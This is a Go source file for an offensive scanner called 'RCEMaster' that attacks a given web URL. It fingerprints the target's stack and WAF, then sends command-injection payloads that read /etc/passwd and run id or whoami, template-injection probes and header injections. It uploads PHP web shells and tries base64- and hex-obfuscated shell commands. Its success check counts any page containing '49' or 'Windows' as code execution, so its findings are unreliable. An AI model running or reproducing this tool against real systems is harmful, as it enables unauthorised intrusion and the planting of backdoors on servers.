package main

import (
	"bytes"
	"crypto/tls"
	"encoding/base64" // ✅ USED
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"mime/multipart" // ✅ USED
	"net/http"
	"net/url"
	"os"
	"regexp"         // ✅ USED
	"strings"
	"sync"           // ✅ USED
	"time"

	"github.com/fatih/color"
)

var banner = "  ____  _____ _____    __  __           _      \n" +
	" |  _ \\| ____|_   _|  |  \\/  | __ _ _ __ | |_ ___\n" +
	" | |_) |  _|   | |    | |\\/| |/ _` | '_ \\| __/ _ \\\n" +
	" |  _ <| |___  | |    | |  | | (_| | | | | ||  __/\n" +
	" |_| \\_\\_____| |_|    |_|  |_|\\__,_|_| |_|\\__\\___|\n" +
	"====================================================\n" +
	" [!] RCEMaster v3.1: Ultimate Complete Edition\n" +
	"====================================================\n"

var (
	green  = color.New(color.FgGreen).SprintFunc()
	yellow = color.New(color.FgYellow).SprintFunc()
	cyan   = color.New(color.FgCyan).SprintFunc()
	red    = color.New(color.FgRed).SprintFunc()
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
}

func getRandomUA() string { return userAgents[rand.Intn(len(userAgents))] }

type TechStack struct { Language, Framework, CMS, Server, WAF string }
type Result struct { URL, Vector, Payload, Evidence, Confidence string; StatusCode int }
type ResponseInfo struct { StatusCode int; Body string; Headers http.Header }

var commandInjectionPayloads = map[string][]string{
	"linux": {";id", "|id", "&&id", "`id`", "$(id)", ";cat /etc/passwd", ";sleep 5"},
	"windows": {"&whoami", "|whoami", "&&whoami", "&dir", "&ipconfig"},
}

var sstiPayloads = map[string][]string{
	"jinja2": {"{{7*7}}", "${7*7}", "{{config}}"},
	"twig": {"{{7*7}}", "{{7*'7'}}"},
}

var fileUploadWebshells = map[string][]string{
	"php": {"<?php system($_GET['cmd']); ?>", "<?=`$_GET[c]`?>"},
}

var headerBasedRCE = map[string][]string{
	"X-Forwarded-Host": {"{{7*7}}", ";id"},
	"Referer": {"{{7*7}}", ";id"},
}

var wafSignatures = map[string]string{"cloudflare": "cloudflare", "akamai": "akamai"}

func init() { rand.Seed(time.Now().UnixNano()) }

func main() {
	urlPtr := flag.String("u", "", "Target URL")
	outputPtr := flag.String("o", "", "Output file")
	delayPtr := flag.Duration("delay", 0, "Delay")
	proxyPtr := flag.String("proxy", "", "Proxy URL")
	flag.Parse()

	if *urlPtr == "" {
		fmt.Printf("%s Usage: rcemaster -u <url>\n", red("[-] Error: URL required."))
		os.Exit(1)
	}

	fmt.Print(cyan(banner))
	fmt.Printf("\n%s Target: %s\n", cyan("[*]"), yellow(*urlPtr))

	techStack := detectTechStack(*urlPtr, *delayPtr, *proxyPtr)
	fmt.Printf("%s Detected: %s %s | WAF: %s\n", green("[+]"), techStack.Language, techStack.CMS, techStack.WAF)

	results := adaptiveRCEAttack(*urlPtr, techStack, *delayPtr, *proxyPtr)

	if len(results) > 0 {
		fmt.Println("\n" + cyan("========== RCE SUCCESSFUL =========="))
		for _, r := range results {
			fmt.Printf("[%s] %s\n", green("RCE"), r.URL)
			fmt.Printf("   -> Vector: %s | Payload: %s\n", yellow(r.Vector), cyan(r.Payload))
			fmt.Printf("   -> Evidence: %s\n\n", r.Evidence)
		}
	} else {
		fmt.Printf("\n%s No RCE vectors worked. Target is secure.\n", yellow("[-]"))
	}

	if *outputPtr != "" && len(results) > 0 {
		saveToFile(results, *outputPtr)
		fmt.Printf("%s Results saved to: %s\n", green("[+]"), *outputPtr)
	}
}

func detectTechStack(targetURL string, delay time.Duration, proxyURL string) TechStack {
	stack := TechStack{}
	info := sendRequest(targetURL, "GET", nil, nil, delay, proxyURL)
	server := strings.ToLower(info.Headers.Get("Server"))
	xPoweredBy := strings.ToLower(info.Headers.Get("X-Powered-By"))
	body := strings.ToLower(info.Body)

	if strings.Contains(server, "php") || strings.Contains(xPoweredBy, "php") { stack.Language = "php" }
	if strings.Contains(server, "tomcat") { stack.Language = "java" }
	if strings.Contains(xPoweredBy, "python") { stack.Language = "python" }
	if strings.Contains(body, "wp-content") { stack.CMS = "wordpress" }
	if info.Headers.Get("Cf-Ray") != "" { stack.WAF = "cloudflare" }
	return stack
}

func adaptiveRCEAttack(targetURL string, stack TechStack, delay time.Duration, proxyURL string) []Result {
	var results []Result
	results = append(results, tryCommandInjection(targetURL, stack, delay, proxyURL)...)
	if len(results) == 0 && stack.Language != "" {
		results = append(results, trySSTI(targetURL, stack, delay, proxyURL)...)
	}
	if len(results) == 0 {
		results = append(results, tryHeaderBasedRCE(targetURL, delay, proxyURL)...)
	}
	if len(results) == 0 && stack.Language == "php" {
		results = append(results, tryFileUploadRCE(targetURL, delay, proxyURL)...)
	}
	if len(results) == 0 {
		fmt.Printf("%s Activating Advanced Obfuscation Engine...\n", yellow("[!]"))
		results = append(results, tryAdvancedObfuscation(targetURL, delay, proxyURL)...)
	}
	return results
}

func tryCommandInjection(targetURL string, stack TechStack, delay time.Duration, proxyURL string) []Result {
	var results []Result
	var mu sync.Mutex // ✅ sync USED
	var wg sync.WaitGroup // ✅ sync USED

	payloads := commandInjectionPayloads["linux"]
	if stack.Language == "dotnet" { payloads = commandInjectionPayloads["windows"] }

	for _, payload := range payloads {
		wg.Add(1)
		go func(p string) {
			defer wg.Done()
			info := sendRequest(targetURL+p, "GET", nil, nil, delay, proxyURL)
			if isRCE(info, p) {
				mu.Lock()
				results = append(results, Result{URL: targetURL + p, Vector: "Cmd Injection", Payload: p, StatusCode: info.StatusCode, Evidence: extractEvidence(info.Body), Confidence: "High"})
				mu.Unlock()
			}
		}(payload)
	}
	wg.Wait()
	return results
}

func trySSTI(targetURL string, stack TechStack, delay time.Duration, proxyURL string) []Result {
	var results []Result
	var mu sync.Mutex
	var wg sync.WaitGroup

	for engine, payloads := range sstiPayloads {
		for _, payload := range payloads {
			wg.Add(1)
			go func(p, eng string) {
				defer wg.Done()
				info := sendRequest(targetURL+"?search="+url.QueryEscape(p), "GET", nil, nil, delay, proxyURL)
				if isRCE(info, p) {
					mu.Lock()
					results = append(results, Result{URL: targetURL + "?search=" + p, Vector: "SSTI (" + eng + ")", Payload: p, StatusCode: info.StatusCode, Evidence: extractEvidence(info.Body), Confidence: "High"})
					mu.Unlock()
				}
			}(payload, engine)
		}
	}
	wg.Wait()
	return results
}

func tryHeaderBasedRCE(targetURL string, delay time.Duration, proxyURL string) []Result {
	var results []Result
	var mu sync.Mutex
	var wg sync.WaitGroup

	for header, payloads := range headerBasedRCE {
		for _, payload := range payloads {
			wg.Add(1)
			go func(h, p string) {
				defer wg.Done()
				info := sendRequest(targetURL, "GET", map[string]string{h: p}, nil, delay, proxyURL)
				if isRCE(info, p) {
					mu.Lock()
					results = append(results, Result{URL: targetURL, Vector: "Header RCE", Payload: h + ": " + p, StatusCode: info.StatusCode, Evidence: extractEvidence(info.Body), Confidence: "Medium"})
					mu.Unlock()
				}
			}(header, payload)
		}
	}
	wg.Wait()
	return results
}

func tryFileUploadRCE(targetURL string, delay time.Duration, proxyURL string) []Result {
	var results []Result
	shells := fileUploadWebshells["php"]

	for _, shell := range shells {
		body := &bytes.Buffer{}
		writer := multipart.NewWriter(body) // ✅ mime/multipart USED
		part, _ := writer.CreateFormFile("file", "shell.php")
		part.Write([]byte(shell))
		writer.Close()

		headers := map[string]string{"Content-Type": writer.FormDataContentType()}
		info := sendRequest(targetURL, "POST", headers, body.Bytes(), delay, proxyURL)
		
		if isRCE(info, shell) {
			results = append(results, Result{URL: targetURL, Vector: "File Upload RCE", Payload: "shell.php", StatusCode: info.StatusCode, Evidence: extractEvidence(info.Body), Confidence: "High"})
		}
	}
	return results
}

func tryAdvancedObfuscation(targetURL string, delay time.Duration, proxyURL string) []Result {
	var results []Result
	var mu sync.Mutex
	var wg sync.WaitGroup

	baseCmds := []string{"id", "whoami"}
	for _, cmd := range baseCmds {
		wg.Add(1)
		go func(c string) {
			defer wg.Done()
			obfuscatedList := obfuscatePayload(c)
			for _, obs := range obfuscatedList {
				info := sendRequest(targetURL+obs, "GET", nil, nil, delay, proxyURL)
				if isRCE(info, c) {
					mu.Lock()
					results = append(results, Result{URL: targetURL + obs, Vector: "Obfuscation", Payload: obs, StatusCode: info.StatusCode, Evidence: extractEvidence(info.Body), Confidence: "High"})
					mu.Unlock()
				}
			}
		}(cmd)
	}
	wg.Wait()
	return results
}

func obfuscatePayload(cmd string) []string {
	var payloads []string
	b64Cmd := base64.StdEncoding.EncodeToString([]byte(cmd)) // ✅ base64 USED
	payloads = append(payloads, fmt.Sprintf("$(echo %s | base64 -d | bash)", b64Cmd))
	
	hexCmd := hex.EncodeToString([]byte(cmd))
	if len(hexCmd) >= 4 {
		payloads = append(payloads, fmt.Sprintf("$(printf '\\x%s\\x%s' | sh)", hexCmd[0:2], hexCmd[2:4]))
	}
	payloads = append(payloads, fmt.Sprintf("cat${IFS}/etc/passwd"))
	return payloads
}

func sendRequest(targetURL, method string, customHeaders map[string]string, body []byte, delay time.Duration, proxyURL string) ResponseInfo {
	if delay > 0 { time.Sleep(delay) }
	var req *http.Request
	var err error
	if body != nil {
		req, err = http.NewRequest(method, targetURL, bytes.NewReader(body))
	} else {
		req, err = http.NewRequest(method, targetURL, nil)
	}
	if err != nil { return ResponseInfo{} }

	req.Header.Set("User-Agent", getRandomUA())
	for k, v := range customHeaders { req.Header.Set(k, v) }

	transport := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	if proxyURL != "" {
		proxyParsed, _ := url.Parse(proxyURL)
		transport.Proxy = http.ProxyURL(proxyParsed)
	}

	client := &http.Client{Timeout: 15 * time.Second, Transport: transport, CheckRedirect: func(req *http.Request, via []*http.Request) error { return http.ErrUseLastResponse }}
	resp, err := client.Do(req)
	if err != nil { return ResponseInfo{} }
	defer resp.Body.Close()

	respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 102400))
	return ResponseInfo{StatusCode: resp.StatusCode, Body: string(respBody), Headers: resp.Header}
}

func isRCE(info ResponseInfo, payload string) bool {
	indicators := []string{"uid=", "root:", "bin/bash", "49", "Windows", "drwx"}
	body := strings.ToLower(info.Body)
	for _, ind := range indicators {
		if strings.Contains(body, strings.ToLower(ind)) { return true }
	}
	return false
}

func extractEvidence(body string) string {
	re := regexp.MustCompile(`(?i)(uid=\d+.*|root:.*|bin/bash|49|drwx)`) // ✅ regexp USED
	match := re.FindString(body)
	if match != "" {
		if len(match) > 80 { return match[:80] + "..." }
		return match
	}
	return "RCE indicator found"
}

func saveToFile(results []Result, filename string) {
	file, _ := os.Create(filename)
	defer file.Close()
	jsonData, _ := json.MarshalIndent(results, "", "  ")
	file.Write(jsonData)
}
